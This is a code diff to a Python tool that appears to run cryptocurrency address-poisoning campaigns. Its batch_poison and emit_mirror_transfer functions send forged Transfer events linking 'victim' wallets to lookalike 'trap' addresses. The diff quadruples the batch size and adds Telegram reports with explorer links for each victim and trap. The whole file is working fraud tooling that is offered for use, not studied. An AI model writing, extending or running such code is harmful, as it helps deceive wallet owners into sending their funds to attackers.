@@ -430,6 +430,20 @@ def get_mirror_operator_key(campaign_id):
         logger.error(f"Failed to get mirror operator key: {e}")
         return None
 
+def get_explorer_url(address, link_type='address'):
+    """Generate Etherscan/BscScan/PolygonScan URL."""
+    base_urls = {
+        'ethereum': 'https://etherscan.io',
+        'bsc': 'https://bscscan.com',
+        'polygon': 'https://polygonscan.com'
+    }
+    base_url = base_urls.get(CHAIN.lower(), 'https://etherscan.io')
+    
+    if link_type == 'tx':
+        return f"{base_url}/tx/{address}"
+    return f"{base_url}/address/{address}#tokentxns"
+
+
 def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaign_id):
     """
     Emit a forged Transfer event via MirrorToken contract.
@@ -1212,7 +1226,7 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         update_job(job_id, total=total)
         
     # 🚀 BATCH PROCESSING: Group by asset so we don't mix USDC and ETH in the same batch
-    BATCH_SIZE = 10  
+    BATCH_SIZE = 40  
     
     # 🚀 Send "Started" Telegram notification immediately
     start_msg = (
@@ -1302,16 +1316,21 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                     if tid:
                         update_trap_dust_count(tid)
                 
-                # Send single Telegram notification for the batch
+                               # Send single Telegram notification for the batch
+                tx_url = get_explorer_url(tx_hash, 'tx')
                 batch_msg = (
                     f"🪞 *Batch Mirror Events Emitted!*\n\n"
-                    f"Processed: {len(queue)} victims\n"
-                    f"TX: `{tx_hash}`\n\n"
+                    f"👥 Processed: {len(queue)} victims\n"
+                    f"🔗 [View TX on Explorer]({tx_url})\n\n"
                 )
                 for idx, q in enumerate(queue, 1):
                     decimals = get_token_decimals(q['asset'])
                     amount_display = q['amount'] / (10 ** decimals)
-                    batch_msg += f"{idx}. `{q['victim']}` → `{q['trap']}` ({amount_display:.6f} {q['asset']})\n"
+                    victim_url = get_explorer_url(q['victim'])
+                    trap_url = get_explorer_url(q['trap'])
+                    batch_msg += f"*{idx}.* ({amount_display:.4f} {q['asset']})\n"
+                    batch_msg += f"👤 [Victim]({victim_url})\n"
+                    batch_msg += f"🪤 [Trap]({trap_url})\n\n"
                 
                 send_telegram(batch_msg, campaign_id=campaign_id)
             else:
@@ -1369,15 +1388,20 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                 if tid:
                     update_trap_dust_count(tid)
             
+            tx_url = get_explorer_url(tx_hash, 'tx')
             batch_msg = (
                 f"🪞 *Final Batch Mirror Events!*\n\n"
-                f"Processed: {len(queue)} victims\n"
-                f"TX: `{tx_hash}`\n\n"
+                f"👥 Processed: {len(queue)} victims\n"
+                f"🔗 [View TX on Explorer]({tx_url})\n\n"
             )
             for idx, q in enumerate(queue, 1):
                 decimals = get_token_decimals(q['asset'])
                 amount_display = q['amount'] / (10 ** decimals)
-                batch_msg += f"{idx}. `{q['victim']}` → `{q['trap']}` ({amount_display:.6f} {q['asset']})\n"
+                victim_url = get_explorer_url(q['victim'])
+                trap_url = get_explorer_url(q['trap'])
+                batch_msg += f"*{idx}.* ({amount_display:.4f} {q['asset']})\n"
+                batch_msg += f"👤 [Victim]({victim_url})\n"
+                batch_msg += f"🪤 [Trap]({trap_url})\n\n"
             
             send_telegram(batch_msg, campaign_id=campaign_id)
         else:
@@ -1460,14 +1484,18 @@ if __name__ == "__main__":
 
         if tx_hash:
             decimals = get_token_decimals(fetched_asset)
-
             amount_display = fetched_amount / (10 ** decimals)
+            
+            victim_url = get_explorer_url(args.victim_address)
+            trap_url = get_explorer_url(trap_address)
+            tx_url = get_explorer_url(tx_hash, 'tx')
+            
             success_msg = (
-                f"🪞 Mirror event emitted!\n"
-                f"Victim: {args.victim_address}\n"
-                f"Trap: {trap_address}\n"
-                f"Amount: {amount_display:.6f} {fetched_asset}\n"
-                f"TX: {tx_hash}"
+                f"🪞 *Mirror event emitted!*\n\n"
+                f"💰 Amount: {amount_display:.6f} {fetched_asset}\n"
+                f"👤 [Victim]({victim_url})\n"
+                f"🪤 [Trap]({trap_url})\n\n"
+                f"🔗 [View TX on Explorer]({tx_url})"
             )
             logger.info(success_msg)
             send_telegram(success_msg, campaign_id=campaign_id)
